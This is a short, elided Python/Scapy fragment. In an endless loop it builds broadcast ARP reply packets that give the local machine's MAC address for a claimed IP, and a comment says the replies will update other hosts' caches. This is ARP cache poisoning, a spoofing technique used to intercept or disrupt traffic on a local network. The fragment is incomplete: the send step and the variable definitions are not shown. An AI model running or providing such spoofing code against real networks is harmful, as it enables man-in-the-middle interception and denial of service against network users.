...
# thsi will be as reply to broadcAST BUT WILL UPDATE CACHES.
...
while True:
	for i in range (4,240):
		...
		pkt=Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2,hwsrc=get_if_hwaddr(iface),psrc=ip_as ,hwdst="ff:ff:ff:ff:ff:ff",pdst=ip_as)
